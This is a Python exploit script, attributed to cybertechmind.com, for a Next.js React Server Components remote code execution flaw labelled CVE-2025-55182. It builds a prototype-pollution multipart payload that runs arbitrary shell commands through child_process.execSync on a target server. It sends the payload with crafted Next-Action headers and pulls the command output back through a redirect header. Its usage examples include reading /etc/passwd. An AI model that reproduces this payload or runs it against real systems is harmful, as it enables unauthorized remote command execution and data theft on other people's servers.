#!/usr/bin/env python3
"""
CVE-2025-55182 - Next.js React Server Components RCE
Tool by: cybertechmind.com

Refactored to use shared utilities with dependency injection pattern.
Configuration loaded from __init__.py for centralized metadata management.
"""

import argparse
import sys
import hashlib
import time
import re
from pathlib import Path
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Add parent directory to path for shared imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared import Theme, Signature, BannerDisplay

# Import configuration from this module's __init__.py
current_dir = Path(__file__).parent
sys.path.insert(0, str(current_dir))

try:
    from . import CVE, TOOL, ASCII_ART, EXPLOIT_CONFIG
except ImportError:
    # Fallback for direct execution
    import __init__ as config
    CVE = config.CVE
    TOOL = config.TOOL
    ASCII_ART = config.ASCII_ART
    EXPLOIT_CONFIG = config.EXPLOIT_CONFIG

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class ExploitConfig:
    """Configuration for CVE-2025-55182 exploit"""
    
    def __init__(self):
        self.target_url = None
        self.payload_cmd = None
        self.timeout = EXPLOIT_CONFIG['timeout']
        self.verify_ssl = EXPLOIT_CONFIG['verify_ssl']
        
    def normalize_url(self, url: str) -> str:
        """Add protocol if missing"""
        if not re.match(r'^https?://', url):
            default_protocol = EXPLOIT_CONFIG['default_protocol']
            return f"{default_protocol}://{url}"
        return url


class PayloadGenerator:
    """Generates exploit payloads for Next.js RCE"""
    
    @staticmethod
    def generate_hash(length: int = 8) -> str:
        """Generate random hash for request IDs"""
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd: str) -> str:
        """Sanitize command for shell injection"""
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def build_exploit_payload(command: str) -> tuple:
        """
        Build malicious payload for Next.js RSC RCE
        
        Args:
            command: Shell command to execute
            
        Returns:
            Tuple of (payload_body, boundary)
        """
        safe_cmd = PayloadGenerator.sanitize_command(command)
        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString().trim().replace(/\\\\n/g, \' | \');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        boundary = EXPLOIT_CONFIG['boundary']
        
        # Build multipart body
        body_parts = [
            f"------CyberTechMindBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------CyberTechMindBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------CyberTechMindBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------CyberTechMindBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary


class ExploitEngine:
    """Main exploitation engine for CVE-2025-55182"""
    
    def __init__(self, config: ExploitConfig, display: BannerDisplay):
        """
        Initialize exploit engine with dependency injection
        
        Args:
            config: Exploitation configuration
            display: Banner display for UI output (injected)
        """
        self.config = config
        self.display = display
        self.session = requests.Session()
        
    def craft_headers(self, boundary: str) -> dict:
        """Craft HTTP headers for exploitation"""
        user_agent = EXPLOIT_CONFIG['user_agent_template'].format(
            author=TOOL.author.replace(' ', '-'),
            version=TOOL.version,
            website=TOOL.website
        )
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': user_agent
        }
    
    def execute(self) -> tuple:
        """
        Execute the exploit
        
        Returns:
            Tuple of (success, status_type, output/error)
        """
        self.display.show_info("Initiating exploitation sequence...")
        payload_body, boundary = PayloadGenerator.build_exploit_payload(self.config.payload_cmd)
        headers = self.craft_headers(boundary)
        self.display.show_info("Establishing connection to target...")
        
        try:
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            return self.parse_response(response)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Connection timeout after 15 seconds'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response) -> tuple:
        """Parse HTTP response for exploitation results"""
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            decoded_output = unquote(encoded_output)
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'


def main():
    """Main execution flow with dependency injection"""
    
    # Initialize signature with tool information from config
    sig = Signature(
        tool_name=TOOL.tool_name,
        version=TOOL.version,
        exploit_name=TOOL.exploit_name
    )
    
    # Initialize display with injected signature
    display = BannerDisplay(sig)
    
    # Show header with ASCII art from config
    display.show_header(ASCII_ART)
    
    # Additional CVE link from config
    print(f"{Theme.OKBLUE}CVE Link: {CVE.references[0]}{Theme.ENDC}\n")
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description=sig.tool_name,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  exploit.py -t localhost:3000 -c "whoami"
  exploit.py -t http://localhost:3000 -c "cat /etc/passwd"
  exploit.py -t http://localhost:3000 -c "ls -la /var/www"
  exploit.py -t http://localhost:3000 -c "id"

{sig.get_footer()}
        """
    )
    
    parser.add_argument('-t', '--target', 
                       metavar='URL',
                       required=True,
                       help='Target URL or domain')
    parser.add_argument('-c', '--command',
                       metavar='CMD',
                       required=True,
                       help='Command to execute on target')
    
    args = parser.parse_args()
    
    # Configure exploit
    config = ExploitConfig()
    config.target_url = config.normalize_url(args.target)
    config.payload_cmd = args.command
    
    # Show configuration
    display.show_config({
        'target': config.target_url,
        'payload': config.payload_cmd
    })
    
    # Execute exploit with dependency injection
    engine = ExploitEngine(config, display)
    success, status, data = engine.execute()
    
    # Display results
    if success:
        display.show_success(data)
        sys.exit(0)
    else:
        display.show_failure(status, data)
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Exploitation interrupted by user{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)